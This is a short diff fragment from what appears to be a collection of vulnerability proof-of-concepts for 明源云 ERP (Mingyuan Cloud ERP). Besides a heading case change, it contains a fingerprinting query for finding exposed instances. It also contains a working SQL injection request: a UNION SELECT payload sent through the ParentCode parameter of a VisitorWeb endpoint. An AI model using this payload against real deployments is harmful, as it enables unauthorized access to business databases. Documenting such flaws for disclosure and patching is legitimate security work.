@@ -8,7 +8,7 @@
 app.name="明源云 ERP"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /CgZtbWeb/VisitorWeb/VisitorWeb_XMLHTTP.aspx?ywtype=GetParentProjectName&ParentCode=1%27+union+select+sum(3233*3323)--+z HTTP/1.1
